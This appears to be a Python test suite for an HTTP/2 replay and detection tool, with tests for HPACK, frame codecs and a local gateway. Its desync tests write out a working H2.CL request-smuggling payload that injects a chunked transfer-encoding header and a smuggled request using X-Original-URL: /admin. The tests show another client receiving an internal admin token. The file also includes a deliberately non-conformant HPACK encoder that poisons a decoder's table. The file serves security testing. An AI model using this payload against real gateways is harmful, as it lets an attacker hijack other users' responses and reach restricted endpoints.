#!/usr/bin/env python3
"""HTTP/2 pseudo-layer tests (master plan Phase 1.1b, v1.20).

The 1.9 acceptance extended to the H2.CL class: CI asserts the raw engine
detects — and now *reproduces* — a desync that curl-classified tooling
cannot express.  Locked contract:

  * hpack: RFC-correct static table, dynamic-table contexts, conformant
    decode (indexed / literal / incr-indexing / size update), verbatim
    raw blocks, non-conformant encode (forbidden indexed-bit literals
    that poison a stateful decoder's table), no-Huffman posture stated
    with a reason;
  * frames: 9-octet codec round-trip, preface, request builders;
  * H2Frontend: minimal H2 gateway over a real HTTP/1.1 backend, with
    the desync switch (``forward_transfer_encoding``) opt-in — safe
    mode never forwards the forbidden TE, desync mode does and the
    **victim's captured response** proves the desync end-to-end;
  * passthrough: HTTP/1.1 clients (desync victims) ride the same
    frontend and same pool.
"""

from __future__ import annotations

import importlib.util
import socket
import sys
import threading
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from tools.runtime.replay.hpack import (  # noqa: E402
    HpackContext, HpackError, STATIC_TABLE, decode_headers, encode_headers,
    encode_int, raw_header_block,
)
from tools.runtime.replay.h2 import (  # noqa: E402
    CLIENT_PREFACE, FT_DATA, FT_GOAWAY, FT_HEADERS, FT_PING, FT_SETTINGS,
    H2Error, H2Frontend, build_data_frame, build_h2_request,
    build_headers_frame, client_preface, encode_frame, parse_frame_header,
    split_frames,
)


def _read_frames(sock, quiet: float = 0.6, limit: float = 8.0) -> bytes:
    """Accumulate client-side bytes until a quiet gap (test helper)."""
    buf = b""
    deadline = time.time() + limit
    sock.settimeout(quiet)
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf


def _first_response(buf: bytes, context: HpackContext):
    frames = split_frames(buf)
    heads = [f for f in frames if f[0] == FT_HEADERS]
    datas = [f for f in frames if f[0] == FT_DATA]
    headers = decode_headers(heads[0][3], context=context)
    return (dict(headers).get(":status"),
            datas[0][3] if datas else b"")


class _BackendStub:
    """One shared live stub backend for the whole module."""

    _server = None

    @classmethod
    def setUpClass(cls):
        spec = importlib.util.spec_from_file_location(
            "stub_target_h2", ROOT / "tests" / "_stub_target.py")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        cls._server = module.ThreadingHTTPServer(("127.0.0.1", 0),
                                                 module.Handler)
        threading.Thread(target=cls._server.serve_forever,
                         daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls._server.shutdown()


class TestHpack(unittest.TestCase):
    def test_static_table_is_rfc_shaped(self):
        self.assertEqual(len(STATIC_TABLE), 62)          # placeholder + 61
        self.assertEqual(STATIC_TABLE[1], (":authority", ""))
        self.assertEqual(STATIC_TABLE[8], (":status", "200"))
        self.assertEqual(STATIC_TABLE[28], ("content-length", ""))
        self.assertEqual(STATIC_TABLE[58], ("user-agent", ""))
        self.assertEqual(STATIC_TABLE[61], ("www-authenticate", ""))

    def test_int_codec_edges(self):
        self.assertEqual(encode_int(126, 7), b"\x7e")
        # RFC continuation: 127 = full prefix, then one continuation byte
        self.assertEqual(encode_int(127, 7), b"\x7f\x00")
        self.assertEqual(encode_int(128, 7), b"\x7f\x01")
        self.assertEqual(encode_int(5, 4, 0x00), b"\x05")
        self.assertEqual(encode_int(15, 4, 0x00), b"\x0f\x00")

    def test_literal_round_trip_and_static_indexing(self):
        ctx = HpackContext()
        block = encode_headers([(":method", "GET"), (":path", "/x"),
                                ("content-length", "17"),
                                ("x-stub-raw", "a b")], context=ctx)
        self.assertEqual(decode_headers(block, context=ctx),
                         [(":method", "GET"), (":path", "/x"),
                          ("content-length", "17"), ("x-stub-raw", "a b")])
        # literal-without-indexing never touches the dynamic table
        self.assertIsNone(ctx.lookup(62))

    def test_incremental_indexing_adds_to_dynamic_table(self):
        ctx = HpackContext()
        block = bytes([0x40, 6]) + b"x-incr" + bytes([1]) + b"v"
        self.assertEqual(decode_headers(block, context=ctx),
                         [("x-incr", "v")])
        self.assertEqual(ctx.lookup(62), ("x-incr", "v"))

    def test_dynamic_table_reference_and_eviction(self):
        ctx = HpackContext(table_size=128)
        ctx.add("a" * 40, "b" * 10)                  # 82 bytes
        ctx.add("c" * 20, "d" * 10)                  # 62 -> evicts first
        self.assertEqual(ctx.lookup(62), ("c" * 20, "d" * 10))
        self.assertIsNone(ctx.lookup(63))

    def test_size_update_changes_capacity(self):
        ctx = HpackContext(table_size=4096)
        ctx.add("k", "v")
        # size update (001xxxxx, prefix 5) with max=0 evicts everything
        self.assertEqual(decode_headers(bytes([0x20]), context=ctx), [])
        self.assertIsNone(ctx.lookup(62))

    def test_raw_header_block_is_verbatim(self):
        block = raw_header_block([("Host", "  padded  "),
                                  ("content-length", "5"),
                                  ("content-length", "6")])
        self.assertEqual(decode_headers(block, raw=True),
                         [("Host", "  padded  "),
                          ("content-length", "5"),
                          ("content-length", "6")])

    def test_non_conformant_encode_poisons_decoder_table(self):
        block = encode_headers([("transfer-encoding", "chunked")], raw=True)
        ctx = HpackContext()
        self.assertEqual(decode_headers(block, context=ctx),
                         [("transfer-encoding", "chunked")])
        # the forbidden 0x40 byte made a stateful decoder INSERT the entry
        self.assertEqual(ctx.lookup(62), ("transfer-encoding", "chunked"))

    def test_huffman_is_rejected_with_stated_reason(self):
        with self.assertRaisesRegex(HpackError, "huffman"):
            decode_headers(bytes([0x00, 0x85]) + b"\xff" * 5)


class TestFrames(unittest.TestCase):
    def test_frame_codec_round_trip(self):
        self.assertEqual(len(encode_frame(1, 4, 1)), 9)
        length, ftype, flags, stream = parse_frame_header(
            encode_frame(1, 4, 0x7FFFFFFF))
        self.assertEqual((length, ftype, flags, stream),
                         (0, 1, 4, 0x7FFFFFFF))

    def test_connection_frames_allow_stream_zero(self):
        preface = client_preface()
        self.assertTrue(preface.startswith(CLIENT_PREFACE))
        self.assertEqual(parse_frame_header(preface[24:33])[1], FT_SETTINGS)
        goaway = encode_frame(FT_GOAWAY, 0, 0, b"\x00" * 8)
        self.assertEqual(parse_frame_header(goaway[:9])[3], 0)

    def test_request_builder_shape(self):
        req = build_h2_request(1, "POST", "/api/checkout", "t.example",
                               headers=[("content-length", "0")],
                               body=b"0\r\n\r\n")
        self.assertTrue(req.startswith(CLIENT_PREFACE))
        frames = split_frames(req, preface=True)
        self.assertEqual([f[0] for f in frames],
                         [FT_SETTINGS, FT_HEADERS, FT_DATA])
        self.assertTrue(frames[1][1] & 0x4)           # END_HEADERS
        self.assertFalse(frames[1][1] & 0x1)          # END_STREAM off (body follows)

    def test_truncated_payload_rejected(self):
        with self.assertRaises(H2Error):
            split_frames(encode_frame(FT_DATA, 0, 1, b"abc")[:-1])

    def test_raw_block_rides_headers_frame(self):
        block = raw_header_block([(":method", "GET"), (":path", "/")])
        frame = build_headers_frame(1, [], raw_block=block)
        self.assertEqual(parse_frame_header(frame[:9])[1], FT_HEADERS)


class TestFrontend(_BackendStub, unittest.TestCase):
    port = property(lambda self: self.__class__.fe_port)

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.fe = H2Frontend("127.0.0.1", cls._server.server_address[1],
                            forward_transfer_encoding=False)
        cls.fe.start()
        cls.fe_port = cls.fe.port

    @classmethod
    def tearDownClass(cls):
        cls.fe.stop()
        super().tearDownClass()

    def test_normal_get_round_trips(self):
        sock = socket.create_connection(("127.0.0.1", self.fe.port),
                                        timeout=10)
        sock.sendall(build_h2_request(1, "GET", "/api/users/1",
                                      f"127.0.0.1:{self.fe.port}"))
        status, body = _first_response(_read_frames(sock),
                                       self.fe.h2_context)
        sock.close()
        self.assertEqual(status, "200")
        self.assertIn(b"alice", body)

    def test_post_body_reaches_the_backend(self):
        sock = socket.create_connection(("127.0.0.1", self.fe.port),
                                        timeout=10)
        sock.sendall(build_h2_request(
            1, "POST", "/api/checkout", f"127.0.0.1:{self.fe.port}",
            headers=[("content-type", "application/json")],
            body=b'{"price": 25}'))
        status, body = _first_response(_read_frames(sock),
                                       self.fe.h2_context)
        sock.close()
        self.assertEqual(status, "200")
        self.assertIn(b'"total": 25', body)

    def test_header_audit_records_decoded_requests(self):
        sock = socket.create_connection(("127.0.0.1", self.fe.port),
                                        timeout=10)
        sock.sendall(build_h2_request(1, "GET", "/api/rates",
                                      f"127.0.0.1:{self.fe.port}"))
        _read_frames(sock)
        sock.close()
        self.assertIn({"method": "GET", "path": "/api/rates", "te": [],
                       "body_bytes": 0}, self.fe.h2_requests)

    def test_http11_passthrough_serves_the_same_backend(self):
        sock = socket.create_connection(("127.0.0.1", self.fe.port),
                                        timeout=10)
        host = f"127.0.0.1:{self.fe.port}"
        sock.sendall(b"GET /api/rates HTTP/1.1\r\nHost: " + host.encode()
                     + b"\r\nConnection: close\r\n\r\n")
        buf = b""
        sock.settimeout(3.0)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        sock.close()
        self.assertIn(b"200", buf.split(b"\r\n")[0])
        self.assertIn(b"EUR_USD", buf)


class TestDesync(_BackendStub, unittest.TestCase):
    """The H2.CL acceptance: forward TE + no synthesized C-L = poisoned
    pooled connection, observed through the VICTIM's response."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.fe = H2Frontend("127.0.0.1", cls._server.server_address[1],
                            forward_transfer_encoding=True)
        cls.fe.start()
        cls.fe_port = cls.fe.port

    @classmethod
    def tearDownClass(cls):
        cls.fe.stop()
        super().tearDownClass()

    def test_te_forwarded_and_client_cl_preserved(self):
        body = b"0\r\n\r\n"
        sock = socket.create_connection(("127.0.0.1", self.fe.port),
                                        timeout=10)
        sock.sendall(build_h2_request(
            1, "POST", "/api/checkout", f"127.0.0.1:{self.fe.port}",
            headers=[("Content-Length", "0"),
                     ("transfer-encoding", "chunked")],
            body=body))
        status, _ = _first_response(_read_frames(sock), self.fe.h2_context)
        sock.close()
        audit = self.fe.h2_requests[-1]
        self.assertEqual(audit["te"], ["chunked"])
        self.assertEqual(audit["body_bytes"], 5)

    def test_h2cl_desync_captures_the_smuggled_response(self):
        body = (b"0\r\n\r\n"
                b"GET /api/gateway HTTP/1.1\r\nHost: internal\r\n"
                b"X-Original-URL: /admin\r\n\r\n")
        attacker = socket.create_connection(("127.0.0.1", self.fe.port),
                                            timeout=10)
        attacker.sendall(build_h2_request(
            1, "POST", "/api/checkout", f"127.0.0.1:{self.fe.port}",
            headers=[("Content-Length", "0"),
                     ("transfer-encoding", "chunked")],
            body=body))
        status, own = _first_response(_read_frames(attacker),
                                      self.fe.h2_context)
        attacker.close()
        self.assertEqual(status, "200")
        self.assertIn(b"order_id", own)               # the attacker's own route

        time.sleep(0.4)                                # smuggled bytes land
        victim = socket.create_connection(("127.0.0.1", self.fe.port),
                                          timeout=10)
        victim.sendall(build_h2_request(1, "GET", "/api/users/1",
                                        f"127.0.0.1:{self.fe.port}"))
        v_status, v_body = _first_response(_read_frames(victim, quiet=1.0),
                                           self.fe.h2_context)
        victim.close()
        # The victim asked for a JSON user record; they received the
        # internal-gateway response — reachable only via X-Original-URL —
        # with its admin token.  The desync, end to end.
        self.assertEqual(v_status, "200")
        self.assertIn(b"internal-gateway", v_body)
        self.assertIn(b"gw-secret-token", v_body)

    def test_desync_switch_is_genuinely_opt_in(self):
        """The same smuggled payload on a SAFE frontend cannot poison:
        TE is withheld, the backend honors C-L:0, no foreign response is
        queued on the pool."""
        safe = H2Frontend("127.0.0.1", type(self)._server.server_address[1],
                          forward_transfer_encoding=False)
        safe.start()
        try:
            body = (b"0\r\n\r\n"
                    b"GET /api/gateway HTTP/1.1\r\nHost: internal\r\n"
                    b"X-Original-URL: /admin\r\n\r\n")
            attacker = socket.create_connection(("127.0.0.1", safe.port),
                                                timeout=10)
            attacker.sendall(build_h2_request(
                1, "POST", "/api/checkout", f"127.0.0.1:{safe.port}",
                headers=[("Content-Length", "0"),
                         ("transfer-encoding", "chunked")],
                body=body))
            status, own = _first_response(_read_frames(attacker),
                                          safe.h2_context)
            attacker.close()
            self.assertEqual(status, "200")
            self.assertIn(b"order_id", own)
            time.sleep(0.4)
            victim = socket.create_connection(("127.0.0.1", safe.port),
                                              timeout=10)
            victim.sendall(build_h2_request(1, "GET", "/api/users/1",
                                            f"127.0.0.1:{safe.port}"))
            v_status, v_body = _first_response(
                _read_frames(victim, quiet=1.0), safe.h2_context)
            victim.close()
            # Safe mode: the victim gets exactly what they asked for.
            self.assertEqual(v_status, "200")
            self.assertIn(b"alice", v_body)
            self.assertNotIn(b"internal-gateway", v_body)
        finally:
            safe.stop()


if __name__ == "__main__":
    unittest.main()
